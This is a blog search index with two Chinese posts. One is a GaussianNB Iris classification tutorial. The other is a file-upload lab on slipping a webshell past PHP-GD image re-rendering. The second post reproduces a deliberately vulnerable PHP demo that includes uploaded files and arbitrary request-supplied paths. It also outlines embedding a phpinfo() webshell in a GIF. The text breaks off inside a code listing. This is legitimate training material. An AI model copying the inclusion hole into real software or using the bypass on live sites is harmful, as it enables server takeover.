<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【机器学习算法】鸢尾花数据集GaussianNB分类预测</title>
      <link href="/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><p> UC Irvine具有用于存储各种数据的大型存储库。 本文使用<strong>鸢尾花数据集</strong>（<a href="https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。" target="_blank" rel="noopener">https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。</a> 为分类任务实施<strong>朴素贝叶斯分类器</strong>。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用<strong>高斯模型</strong>。</p><a id="more"></a><h3 id="0x01-实验流程"><a href="#0x01-实验流程" class="headerlink" title="0x01 实验流程"></a>0x01 实验流程</h3><h4 id="1-1-加载鸢尾花数据集"><a href="#1-1-加载鸢尾花数据集" class="headerlink" title="1.1 加载鸢尾花数据集"></a>1.1 加载鸢尾花数据集</h4><ul><li>采用sklearn.datasets模块导入load_iris数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris()</span><br></pre></td></tr></table></figure><h4 id="1-2-存储特征矩阵和响应向量"><a href="#1-2-存储特征矩阵和响应向量" class="headerlink" title="1.2 存储特征矩阵和响应向量"></a>1.2 存储特征矩阵和响应向量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target</span><br></pre></td></tr></table></figure><h4 id="1-3-将X和y分为训练和测试集"><a href="#1-3-将X和y分为训练和测试集" class="headerlink" title="1.3 将X和y分为训练和测试集"></a>1.3 将X和y分为训练和测试集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h5 id="sklearn-model-selection-train-test-split用法"><a href="#sklearn-model-selection-train-test-split用法" class="headerlink" title="sklearn.model_selection.train_test_split用法"></a><strong>sklearn.model_selection.train_test_split</strong>用法</h5><blockquote><ul><li><p>作用：将数组或矩阵拆分为训练集和测试集</p></li><li><p>语法：<code>sklearn.model_selection.train_test_split(*arrays, **options)</code></p></li><li><p>train_test_split里面常用的因数（arguments）介绍：</p><blockquote><ul><li>arrays：分割对象同样长度的列表或者numpy arrays，矩阵。</li><li>test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25.</li><li>train_size：和test_size相似。</li><li>random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。</li><li>shuffle和straify不常用。straify就是将数据分层。</li></ul></blockquote></li><li><p>返回值：将输入列表拆分为训练和测试集</p></li></ul></blockquote><h5 id="train-test-split-用法举例："><a href="#train-test-split-用法举例：" class="headerlink" title="train_test_split 用法举例："></a>train_test_split 用法举例：</h5><blockquote><p>这个数据集 4列，12行</p></blockquote><ul><li>使用pandas模块，制作数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">namelist = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">"name"</span> : [<span class="string">"Suzuki"</span>, <span class="string">"Tanaka"</span>, <span class="string">"Yamada"</span>, <span class="string">"Watanabe"</span>, <span class="string">"Yamamoto"</span>,</span><br><span class="line">             <span class="string">"Okada"</span>, <span class="string">"Ueda"</span>, <span class="string">"Inoue"</span>, <span class="string">"Hayashi"</span>, <span class="string">"Sato"</span>,</span><br><span class="line">              <span class="string">"Hirayama"</span>, <span class="string">"Shimada"</span>],</span><br><span class="line">    <span class="string">"age"</span>: [<span class="number">30</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">49</span>, <span class="number">53</span>],</span><br><span class="line">    <span class="string">"department"</span>: [<span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"HR"</span>, <span class="string">"IT"</span>,</span><br><span class="line">                  <span class="string">"Legal"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"Legal"</span>],</span><br><span class="line">    <span class="string">"attendance"</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"> &#125;)</span><br><span class="line">namelist</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来是将testing数据指定为具体数目。test_size=5</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">5</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来将training data 指定为0.5（training_size=0.5）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="literal">None</span>, train_size=<span class="number">0.5</span>)</span><br><span class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>shuffle功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, shuffle=<span class="literal">False</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><h4 id="1-4-使用高斯模型训练数据集"><a href="#1-4-使用高斯模型训练数据集" class="headerlink" title="1.4 使用高斯模型训练数据集"></a>1.4 使用高斯模型训练数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#引入高斯朴素贝叶斯</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">gnb = GaussianNB() </span><br><span class="line"><span class="comment">#训练数据 fit相当于train</span></span><br><span class="line">gnb.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>GaussianNB(priors=None, var_smoothing=1e-09)</code></pre><h4 id="1-5-测试集预测"><a href="#1-5-测试集预测" class="headerlink" title="1.5 测试集预测"></a>1.5 测试集预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test)</span><br></pre></td></tr></table></figure><h4 id="1-6-比较预测值和实际值"><a href="#1-6-比较预测值和实际值" class="headerlink" title="1.6 比较预测值和实际值"></a>1.6 比较预测值和实际值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre><ul><li>sklearn.metrics中的评估方法介绍（<a href="https://blog.csdn.net/cherdw/article/details/55813071）" target="_blank" rel="noopener">https://blog.csdn.net/cherdw/article/details/55813071）</a></li></ul><h4 id="1-7-完整代码"><a href="#1-7-完整代码" class="headerlink" title="1.7 完整代码"></a>1.7 完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris() </span><br><span class="line"></span><br><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target </span><br><span class="line"></span><br><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line">gnb = GaussianNB() </span><br><span class="line">gnb.fit(X_train, y_train) </span><br><span class="line"></span><br><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test) </span><br><span class="line"></span><br><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
          <category> 机器学习算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> GaussianNB </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（五）：高级利用】5.1 图片重绘</title>
      <link href="/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/"/>
      <url>/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>重绘图的概念</li><li>图片重绘实例分析，PHP输出图像函数</li></ul><a id="more"></a><h3 id="0x01-重绘图"><a href="#0x01-重绘图" class="headerlink" title="0x01 重绘图"></a>0x01 重绘图</h3><blockquote><p>应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell.</p></blockquote><ul><li><p>如何绕过</p><ul><li>将正常图片用目标使用的图像库进行转换</li><li>寻找转换前后两次未变的部分</li><li>将未变部分替换为欲上传的WebShell</li><li>将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分</li></ul></li><li><p>比如：</p><p>  转换前：1233333abcdefg[1111222333]sdas213</p><p>  转换后：xsadssdddsdddd[1111222333]2313322</p></li></ul><h3 id="0x02-实战练习"><a href="#0x02-实战练习" class="headerlink" title="0x02 实战练习"></a>0x02 实战练习</h3><ul><li>参考代码地址<br><a href="https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE" target="_blank" rel="noopener">https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></li></ul><h4 id="2-1-部署"><a href="#2-1-部署" class="headerlink" title="2.1 部署"></a>2.1 部署</h4><ul><li>将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload01.png" alt=""></li></ul><h4 id="2-2-上传代码"><a href="#2-2-上传代码" class="headerlink" title="2.2 上传代码"></a>2.2 上传代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;Choose image to upload, then <span class="string">"include $upload_path;"</span> to show some data.&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;<span class="keyword">or</span>, <span class="keyword">use</span> <span class="title">parameter</span> "<span class="title">file</span>" <span class="title">to</span> <span class="title">include</span> <span class="title">file</span>, <span class="title">e</span>.<span class="title">g</span>. <span class="title">http</span>://<span class="title">xxxxx</span>/<span class="title">index</span>.<span class="title">php</span>?<span class="title">file</span>=&amp;<span class="title">lt</span>;something&amp;gt;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"upfile"</span>])) &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $img_info = getimagesize($temp_file);</span><br><span class="line">    <span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">        $upload_file = <span class="string">"test.gif"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_file, $upload_file)) &#123;</span><br><span class="line">            printf(<span class="string">"Image upload process error, please check out.\n"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(<span class="string">"Path: %s, image upload successful!\n"</span>, $upload_file);</span><br><span class="line">        <span class="keyword">include</span> $upload_file;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printf(<span class="string">"Image type not support in this demo, GIF please...\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">"file"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>imagecreatefromgif()</code>函数</p><blockquote><ul><li>由文件或 URL 创建一个新图象</li><li>描述：<code>imagecreatefromgif ( string $filename )</code>返回一图像标识符，代表了从给定的文件名取得的图像</li></ul></blockquote></li><li><p>PHP 输出图像</p><ul><li><code>imagegif()、imagejpeg()、imagepng() 和 imagewbmp()</code>函数分别允许以 GIF、JPEG、PNG 和 WBMP 格式将图像输出到浏览器或文件。</li><li>语法：<blockquote><ul><li><code>bool imagegif ( resource image [, string filename] )</code></li><li><code>bool imagejpeg ( resource image [, string filename [, int quality]] )</code></li><li><code>bool imagepng ( resource image [, string filename] )</code></li><li><code>bool imagewbmp ( resource image [, string filename [, int foreground]] )</code></li></ul></blockquote></li><li>参数说明：<blockquote><ul><li>image    欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值</li><li>filename    可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。</li><li>quality    可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数</li><li>foreground    可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数</li></ul></blockquote></li></ul></li></ul><h4 id="2-3-上传利用copy制作的图片木马"><a href="#2-3-上传利用copy制作的图片木马" class="headerlink" title="2.3 上传利用copy制作的图片木马"></a>2.3 上传利用copy制作的图片木马</h4><ul><li><p>图片demotest.gif 含phpinfo()WebShell，测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload02.png" alt=""></p></li><li><p>分析上传成功的test.gif和demotest.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload03.png" alt=""></p></li></ul><h4 id="2-4-图片转换代码"><a href="#2-4-图片转换代码" class="headerlink" title="2.4 图片转换代码"></a>2.4 图片转换代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 